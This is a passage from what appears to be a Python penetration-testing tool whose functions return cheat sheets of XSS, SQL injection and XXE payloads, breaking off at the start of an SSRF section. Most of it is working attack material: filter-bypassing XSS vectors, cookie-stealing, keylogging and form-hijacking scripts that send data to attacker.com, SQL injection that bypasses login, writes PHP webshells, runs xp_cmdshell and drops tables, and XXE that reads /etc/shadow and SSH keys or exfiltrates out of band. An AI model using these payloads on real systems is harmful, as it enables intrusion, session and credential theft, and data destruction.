{{$new.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
&#123&#123$new.constructor('alert(1)')()&#125&#125
<x ng-init=a='alert(1)'>{{$new.constructor(a)()}}

═══════════════════════════════════════════════════════════════════
BYPASS - INSIDE COMMENTS
═══════════════════════════════════════════════════════════════════

Vector if anything inside HTML comments are allowed

<!--><svg onload=alert(1)-->

═══════════════════════════════════════════════════════════════════
BYPASS - AGNOSTIC EVENT HANDLERS - NATIVE SCRIPT BASED
═══════════════════════════════════════════════════════════════════

Event handlers with arbitrary tag names to bypass blacklists
Require script loaded after injection point

<x onafterscriptexecute=alert(1)>
<x onbeforescriptexecute=alert(1)>

═══════════════════════════════════════════════════════════════════
BYPASS - AGNOSTIC EVENT HANDLERS - CSS3 BASED
═══════════════════════════════════════════════════════════════════

Event handlers with arbitrary tag names to bypass blacklists
Require CSS via <style> or <link>. Last 4 work only in Firefox

<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}
<x onanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
<x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{}
<x onwebkitanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
<x ontransitionend=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitionrun=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitionstart=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitioncancel=alert(1)><style>*{transition:color 1s}*:hover{color:red}

═══════════════════════════════════════════════════════════════════
EXTRA - BODY TAG VECTORS
═══════════════════════════════════════════════════════════════════

Collection of body vectors. Last one works only for IE

<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><meta content=URL;%23 http-equiv=refresh>
<body onscroll=alert(1) style=overflow:auto;height:1000px id=x>#x
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><x id=x>#x
<body onresize=alert(1)>press F11!
<body onhelp=alert(1)>press F1!

═══════════════════════════════════════════════════════════════════
EXTRA - LESS KNOWN XSS VECTORS
═══════════════════════════════════════════════════════════════════

<marquee onstart=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<video ontimeupdate=alert(1) controls src=//attacker.com/x.mp4>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
<object onerror=alert(1)>

═══════════════════════════════════════════════════════════════════
EXTRA - LOCATION BASED PAYLOADS
═══════════════════════════════════════════════════════════════════

Evade filters detecting/blocking parentheses

<svg/onload=location='javascript:alert(1)'>
<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
<svg/onload=location='javas'%2B'cript:'%2B'ale'%2B'rt'%2Blocation.hash.substr(1)>#(1)
<svg/onload=location=%27javas%27%2B%27cript:%27%2B%27ale%27%2B%27rt%27%2Blocation.hash.substr%281%29>#%281%29
<svg/onload=location=/javas/.source%2B/cript:/.source%2B/ale/.source%2B/rt/.source%2Blocation.hash.substr(1)>#(1)
<svg/onload=location=/javas/.source%2B/cript:/.source%2B/ale/.source%2B/rt/.source%2Blocation.hash[1]%2B1%2Blocation.hash[2]>#()

Using tagName property:
<svg onload=alert(tagName)>
<javascript onclick=alert(tagName)>click me!
<javascript onclick=alert(tagName%2Blocation.hash)>click me!#:alert(1)
<javascript: onclick=alert(tagName%2BinnerHTML%2Blocation.hash)>/*click me!#*/alert(1)
<javascript: onclick=location=tagName%2BinnerHTML%2Blocation.hash>/*click me!#*/alert(1)
<javascript: onclick=location=tagName%2BinnerHTML%2Blocation.hash>'click me!#'-alert(1)

Bypassing Javascript Overrides:
<svg onload=document.writeln(decodeURI(location.hash))>#<img src=1 onerror=alert(1)>

═══════════════════════════════════════════════════════════════════
EXTRA - XSS IN LIMITED INPUT FORMATS
═══════════════════════════════════════════════════════════════════

Email Format:
"><svg/onload=alert(1)>"@x.y

URL (No Query):
javascript://%250Aalert(1)

URL (With Query):
javascript://https://domain.com/%250A1?alert(1):0

Key Format:
12345678901<svg onload=alert(1)>

═══════════════════════════════════════════════════════════════════
EXTRA - XSS WITHOUT EVENT HANDLERS (BRUTELOGIC)
═══════════════════════════════════════════════════════════════════

No Attribute:
<script>alert(1)</script>

Using src:
<script src=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>

Using href:
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click

Using action:
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>

Using formaction:
<form><button formaction=javascript:alert(1)>click</form>
<input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>

Using data:
<object data=javascript:alert(1)>

Using srcdoc:
<iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;>

Using xlink:href:
<svg><script xlink:href=data:,alert(1)></script>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click

Using from:
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26>

═══════════════════════════════════════════════════════════════════
POLYGLOTS - UNIVERSAL XSS PAYLOADS
═══════════════════════════════════════════════════════════════════

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">

javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*

javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a

javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/

javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*

javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*

javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//

javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*

--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*

/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*

javascript://--></title></style></textarea></script><svg "//' onclick=alert()//

/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*

JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->

═══════════════════════════════════════════════════════════════════
EXPLOITATION FRAMEWORKS
═══════════════════════════════════════════════════════════════════

BeEF Hook:
<script src="http://attacker.com:3000/hook.js"></script>

Cookie Stealer:
<script>fetch('https://attacker.com?c='+document.cookie)</script>
<script>new Image().src='https://attacker.com?c='+document.cookie</script>
<img src=x onerror=this.src='https://attacker.com?c='+document.cookie>

Keylogger:
<script>
document.addEventListener('keypress', e => {
  fetch('https://attacker.com/log?k='+e.key);
});
</script>

Session Hijacker:
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  })
});
</script>

Phishing Redirect:
<script>window.location='https://attacker.com/phishing'</script>

Form Hijacker:
<script>
document.querySelectorAll('form').forEach(f => {
  f.addEventListener('submit', e => {
    fetch('https://attacker.com/formdata', {
      method: 'POST',
      body: new FormData(f)
    });
  });
});
</script>

═══════════════════════════════════════════════════════════════════
REFERENCE - WAF BYPASS ENCODING TECHNIQUES
═══════════════════════════════════════════════════════════════════

URL Encoding: %3Cscript%3Ealert(1)%3C/script%3E
Double URL Encoding: %253Cscript%253Ealert(1)%253C/script%253E
HTML Entities: &lt;script&gt;alert(1)&lt;/script&gt;
Hex Entities: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
Decimal Entities: &#60;script&#62;alert(1)&#60;/script&#62;
Unicode: \u003cscript\u003ealert(1)\u003c/script\u003e
UTF-7: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
Overlong UTF-8: %C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE

XSS VECTOR SCHEMES - SEPARATOR CHARACTERS:
Between tag and attribute: / %0A %0B %0C %0D %09 (space)
Between attribute and =: %0A %0B %0C %0D %09 (space) or nothing
Between = and value: %0A %0B %0C %0D %09 (space) or nothing
Value wrapper: " ' ` or nothing

═══════════════════════════════════════════════════════════════════
NOTES
═══════════════════════════════════════════════════════════════════

• Test payloads in order: Basic → Advanced → Bypass
• Always test without encoding first, then add encoding as needed
• Context matters: HTML, JavaScript, Attribute, URL
• Some payloads require user interaction (click, hover, focus)
• Modern browsers have XSS filters - test in multiple browsers
• CSP (Content Security Policy) can block many vectors
• Use browser developer console to debug payload execution
• Combine techniques for maximum effectiveness
• Always test in a legal and authorized environment

"""


# ============================================================================
# SQL INJECTION
# ============================================================================


def generate_sql_methodology():
    """SQL Injection complete methodology"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║               🎯 SQL INJECTION COMPLETE METHODOLOGY              ║
╚══════════════════════════════════════════════════════════════════╝

📋 PROFESSIONAL TESTING WORKFLOW
═══════════════════════════════════════════════════════════════════

Phase 1: DETECTION
├─ Error-based detection
├─ Boolean-based detection
├─ Time-based detection
└─ UNION-based detection

Phase 2: FINGERPRINTING
├─ DBMS identification
├─ Version enumeration
└─ User/privilege detection

Phase 3: EXPLOITATION
├─ Data extraction
├─ Authentication bypass
└─ File system access

Phase 4: POST-EXPLOITATION
├─ OS command execution
└─ Privilege escalation

═══════════════════════════════════════════════════════════════════
PHASE 1: DETECTION TECHNIQUES
═══════════════════════════════════════════════════════════════════

🔍 ERROR-BASED DETECTION:

Single quote test:
Input: '
Expected: SQL error message

Boolean-based test:
/product?id=1 AND 1=1 (True - normal page)
/product?id=1 AND 1=2 (False - different page)

Time-based test:
MySQL: /product?id=1 AND SLEEP(5)
MSSQL: /product?id=1; WAITFOR DELAY '0:0:5'--
PostgreSQL: /product?id=1; SELECT pg_sleep(5)--

═══════════════════════════════════════════════════════════════════
PHASE 2: DBMS FINGERPRINTING
═══════════════════════════════════════════════════════════════════

MySQL:
' AND @@version LIKE '%5.%'--
SELECT @@version

MSSQL:
' AND @@version LIKE '%Microsoft%'--
SELECT @@version

PostgreSQL:
' AND version() LIKE '%PostgreSQL%'--
SELECT version()

Oracle:
' AND banner LIKE '%Oracle%' FROM v$version--
SELECT banner FROM v$version

═══════════════════════════════════════════════════════════════════
PHASE 3: EXPLOITATION
═══════════════════════════════════════════════════════════════════

UNION-Based Extraction:

Step 1: Find column count
' ORDER BY 1--
' ORDER BY 2--
... until error

Step 2: Extract data
MySQL:
' UNION SELECT username,password,email FROM users--

MSSQL:
' UNION SELECT name,2,3 FROM sys.databases--

Boolean-Based Blind:
' AND (SELECT SUBSTRING(password,1,1) FROM users)='a'--

Time-Based Blind:
' AND IF((SELECT SUBSTRING(database(),1,1))='a',SLEEP(5),0)--

═══════════════════════════════════════════════════════════════════
AUTHENTICATION BYPASS
═══════════════════════════════════════════════════════════════════

username: admin' OR '1'='1'--
password: anything

username: admin'--
password: anything

username: ' OR 1=1--
password: anything

═══════════════════════════════════════════════════════════════════
FILE OPERATIONS
═══════════════════════════════════════════════════════════════════

MySQL - Read file:
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--

MySQL - Write webshell:
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

MSSQL - Execute commands:
'; EXEC xp_cmdshell 'whoami'--

PostgreSQL - Execute commands:
'; COPY cmd_exec FROM PROGRAM 'id'--

═══════════════════════════════════════════════════════════════════
WAF BYPASS
═══════════════════════════════════════════════════════════════════

Space bypass:
' UNION/**/SELECT/**/1--
' UNION+SELECT+1--
' UNION%0ASELECT%0A1--

Keyword bypass:
'/*!50000UNION*//*!50000SELECT*/1--
' UnIoN SeLeCt 1--

Comment bypass:
' UNION SELECT 1-- 
' UNION SELECT 1#

═══════════════════════════════════════════════════════════════════
TESTING CHECKLIST
═══════════════════════════════════════════════════════════════════

☐ GET parameters
☐ POST parameters
☐ HTTP headers
☐ JSON payloads
☐ XML payloads
☐ Cookie values
☐ ORDER BY clause
☐ LIMIT/OFFSET
☐ Second-order injection"""


def generate_sql_payloads():
    """Comprehensive SQL injection payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              💉 SQL INJECTION PAYLOAD LIBRARY                   ║
╚══════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════
DETECTION PAYLOADS
═══════════════════════════════════════════════════════════════════

'
"
`
')
")
`)
'))
"))
`))

' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1
") OR "1"="1

═══════════════════════════════════════════════════════════════════
AUTHENTICATION BYPASS
═══════════════════════════════════════════════════════════════════

admin' OR '1'='1'--
admin'--
admin' #
admin'/*
' OR 1=1--
' OR '1'='1'--
admin' OR 1=1--
admin' OR 1=1#
') OR ('1'='1
") OR ("1"="1

═══════════════════════════════════════════════════════════════════
UNION-BASED EXTRACTION
═══════════════════════════════════════════════════════════════════

Column count detection:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

MySQL:
' UNION SELECT database(),user(),@@version--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,email FROM users--

MSSQL:
' UNION SELECT db_name(),user_name(),@@version--
' UNION SELECT name,2,3 FROM sys.databases--
' UNION SELECT name,2,3 FROM sys.tables--
' UNION SELECT username,password,3 FROM users--

PostgreSQL:
' UNION SELECT current_database(),current_user(),version()--
' UNION SELECT tablename,2,3 FROM pg_tables--
' UNION SELECT username,password,3 FROM users--

Oracle:
' UNION SELECT banner,NULL,NULL FROM v$version--
' UNION SELECT table_name,NULL,NULL FROM all_tables--
' UNION SELECT username,password,NULL FROM users--

═══════════════════════════════════════════════════════════════════
ERROR-BASED EXTRACTION
═══════════════════════════════════════════════════════════════════

MySQL:
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' OR 1 GROUP BY concat_ws(0x7e,version(),floor(rand(0)*2)) HAVING min(0)--

MSSQL:
' AND 1=convert(int,(SELECT @@version))--
' AND 1=convert(int,(SELECT db_name()))--

PostgreSQL:
' AND 1=cast((SELECT version()) as int)--

═══════════════════════════════════════════════════════════════════
BOOLEAN-BASED BLIND
═══════════════════════════════════════════════════════════════════

' AND (SELECT SUBSTRING(database(),1,1))='a'--
' AND (SELECT SUBSTRING(database(),1,1))='b'--

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

' AND LENGTH(database())>5--
' AND ASCII(SUBSTRING(database(),1,1))>100--

═══════════════════════════════════════════════════════════════════
TIME-BASED BLIND
═══════════════════════════════════════════════════════════════════

MySQL:
' AND SLEEP(5)--
' AND IF((SELECT SUBSTRING(database(),1,1))='a',SLEEP(5),0)--
' AND IF(LENGTH(database())>5,SLEEP(5),0)--

MSSQL:
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT SUBSTRING(db_name(),1,1))='m' WAITFOR DELAY '0:0:5'--

PostgreSQL:
'; SELECT pg_sleep(5)--
' AND CASE WHEN (SELECT SUBSTRING(current_database(),1,1))='p' THEN pg_sleep(5) ELSE pg_sleep(0) END--

Oracle:
' AND dbms_pipe.receive_message('a',5)=1--

═══════════════════════════════════════════════════════════════════
STACKED QUERIES
═══════════════════════════════════════════════════════════════════

'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; DROP TABLE logs--
'; EXEC xp_cmdshell 'whoami'--

═══════════════════════════════════════════════════════════════════
FILE OPERATIONS
═══════════════════════════════════════════════════════════════════

MySQL - Read:
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts')--

MySQL - Write:
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

MSSQL - xp_cmdshell:
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'net user hacker Pass123! /add'--

PostgreSQL - COPY:
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--
'; COPY cmd_exec FROM PROGRAM 'id'--

═══════════════════════════════════════════════════════════════════
WAF BYPASS
═══════════════════════════════════════════════════════════════════

Space bypass:
'/**/UNION/**/SELECT/**/1--
'/*comment*/UNION/*comment*/SELECT/*comment*/1--
'+UNION+SELECT+1--
'%0AUNION%0ASELECT%0A1--
'%09UNION%09SELECT%091--

Keyword bypass:
'/*!50000UNION*//*!50000SELECT*/1--
'/*! UNION *//*! SELECT */1--
'UnIoN SeLeCt 1--
'union/**/select 1--

Quote bypass:
' UNION SELECT 0x61646D696E--  (hex for 'admin')
' UNION SELECT CHAR(97,100,109,105,110)--  (CHAR function)

Comment bypass:
' UNION SELECT 1-- 
' UNION SELECT 1#
' UNION SELECT 1/*

Equals bypass:
' OR username LIKE 'admin'--
' OR username IN ('admin')--

═══════════════════════════════════════════════════════════════════
DATABASE ENUMERATION
═══════════════════════════════════════════════════════════════════

MySQL:
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT user,password FROM mysql.user--

MSSQL:
' UNION SELECT name FROM sys.databases--
' UNION SELECT name FROM sys.tables--
' UNION SELECT name FROM sys.columns WHERE object_id=object_id('users')--

PostgreSQL:
' UNION SELECT datname FROM pg_database--
' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

Oracle:
' UNION SELECT table_name FROM all_tables--
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--"""


# ============================================================================
# XXE (XML EXTERNAL ENTITY)
# ============================================================================


def generate_xxe_methodology():
    """XXE testing methodology"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🎯 XXE COMPLETE METHODOLOGY                     ║
╚══════════════════════════════════════════════════════════════════╝

📋 PROFESSIONAL TESTING WORKFLOW
═══════════════════════════════════════════════════════════════════

Phase 1: DETECTION
├─ Identify XML input points
├─ Test for external entity support
└─ Check parser configuration

Phase 2: EXPLOITATION
├─ File disclosure
├─ SSRF attacks
├─ Denial of Service
└─ Port scanning

Phase 3: ADVANCED TECHNIQUES
├─ Blind XXE
├─ Out-of-band XXE
├─ Error-based XXE
└─ XInclude attacks

═══════════════════════════════════════════════════════════════════
PHASE 1: DETECTION
═══════════════════════════════════════════════════════════════════

🔍 Basic XXE Test:

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "test">
]>
<root>&xxe;</root>

If "test" appears in response → XXE possible

🔍 External Entity Test:

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

If file contents appear → XXE confirmed

═══════════════════════════════════════════════════════════════════
PHASE 2: EXPLOITATION TECHNIQUES
═══════════════════════════════════════════════════════════════════

📁 File Disclosure:

Linux:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]>

Windows:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>

PHP wrapper:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

🌐 SSRF via XXE:

Internal network scan:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080">]>

Cloud metadata:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

💣 Denial of Service (Billion Laughs):

<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>

═══════════════════════════════════════════════════════════════════
PHASE 3: ADVANCED TECHNIQUES
═══════════════════════════════════════════════════════════════════

🔒 Blind XXE (Out-of-Band):

Step 1 - Trigger callback:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

Step 2 - evil.dtd content:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
%send;

🚨 Error-Based XXE:

<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; fail SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %fail;
]>

📦 XInclude Attack (when full XML not controlled):

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

═══════════════════════════════════════════════════════════════════
TESTING CHECKLIST
═══════════════════════════════════════════════════════════════════

☐ SOAP requests
☐ REST API (Accept: application/xml)
☐ File upload (SVG, DOCX, XLSX, PDF)
☐ RSS feeds
☐ SAML authentication
☐ Configuration files
☐ Office documents (metadata)
☐ Custom XML formats"""


def generate_xxe_payloads():
    """XXE payload collection"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                     🔓 XXE PAYLOAD LIBRARY                       ║
╚══════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════
BASIC XXE
═══════════════════════════════════════════════════════════════════

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

═══════════════════════════════════════════════════════════════════
FILE DISCLOSURE
═══════════════════════════════════════════════════════════════════

Linux files:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">]>

Windows files:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">]>

PHP wrapper (base64 encode):
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>

═══════════════════════════════════════════════════════════════════
SSRF VIA XXE
═══════════════════════════════════════════════════════════════════

Internal network:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]>

Port scanning:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:3306">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:6379">]>

Cloud metadata:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>

═══════════════════════════════════════════════════════════════════
BLIND XXE (OUT-OF-BAND)
═══════════════════════════════════════════════════════════════════

Trigger DNS callback:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>

Parameter entity:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

evil.dtd on attacker server:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
%send;

═══════════════════════════════════════════════════════════════════
ERROR-BASED XXE
═══════════════════════════════════════════════════════════════════

<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; fail SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %fail;
]>

═══════════════════════════════════════════════════════════════════
XINCLUDE ATTACKS
═══════════════════════════════════════════════════════════════════

When you can only control data inside XML:

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

═══════════════════════════════════════════════════════════════════
SVG XXE
═══════════════════════════════════════════════════════════════════

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

═══════════════════════════════════════════════════════════════════
DENIAL OF SERVICE
═══════════════════════════════════════════════════════════════════

Billion Laughs Attack:
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>

Quadratic Blowup:
<!DOCTYPE bomb [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaa..."> (repeat 10000 times)
]>
<bomb>&a;&a;&a;...</bomb> (repeat 10000 times)

═══════════════════════════════════════════════════════════════════
OFFICE DOCUMENT XXE
═══════════════════════════════════════════════════════════════════

DOCX/XLSX/PPTX are ZIP files containing XML.

1. Unzip document
2. Edit word/document.xml or xl/workbook.xml
3. Add XXE payload:

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document>&xxe;</w:document>

4. Rezip and upload"""


# ============================================================================
# SSRF (SERVER-SIDE REQUEST FORGERY)
# ============================================================================


def generate_ssrf_methodology():
    """SSRF testing methodology"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                   🎯 SSRF COMPLETE METHODOLOGY                   ║
╚══════════════════════════════════════════════════════════════════╝

📋 PROFESSIONAL TESTING WORKFLOW
═══════════════════════════════════════════════════════════════════

Phase 1: DETECTION
├─ Identify URL parameters
├─ Find import/fetch functionality
└─ Locate file upload features

Phase 2: FILTER BYPASS
├─ URL encoding
├─ DNS rebinding
├─ Alternative IP encodings
└─ Protocol smuggling

Phase 3: EXPLOITATION
├─ Internal network access
├─ Cloud metadata extraction
├─ Port scanning
└─ Protocol smuggling attacks

═══════════════════════════════════════════════════════════════════
PHASE 1: DETECTION
═══════════════════════════════════════════════════════════════════

🔍 Common SSRF Entry Points:

URL parameters:
?url=http://example.com
?uri=http://example.com
?path=http://example.com
?redirect=http://example.com
?fetch=http://example.com
?next=http://example.com

File import:
?import=http://example.com/file.xml
